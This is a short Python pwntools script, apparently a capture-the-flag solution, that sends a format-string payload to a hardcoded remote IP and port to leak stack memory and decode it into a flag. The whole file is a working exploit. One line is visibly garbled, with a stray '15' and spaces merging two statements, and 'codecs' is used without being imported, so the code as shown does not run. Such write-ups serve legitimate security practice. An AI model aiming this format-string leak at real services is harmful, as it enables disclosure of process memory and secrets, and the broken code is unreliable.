#!/usr/bin/env python
# coding=utf-8
from pwn import *
import binascii
ip   = '140.110.112.31'
prot = 6127
#r = process("./fmtstr")

r = remote(ip, prot)
r.sendline("%12$p%13$p%14$p%15$p%16$p%17$p%18$p")
data = r.recv()
data = data.split(b"0x")
flag = b""
for _ in data:                                                                                                       15     tmp = ""
    print(_)
    for n in range(7, -1,-1):
        tmp +=  str((_[n*2:n*2+2]), encoding="utf-8")
    flag += codecs.decode(tmp, "hex")
print("=" * 50)
print(flag)
print("=" * 50)
r.close()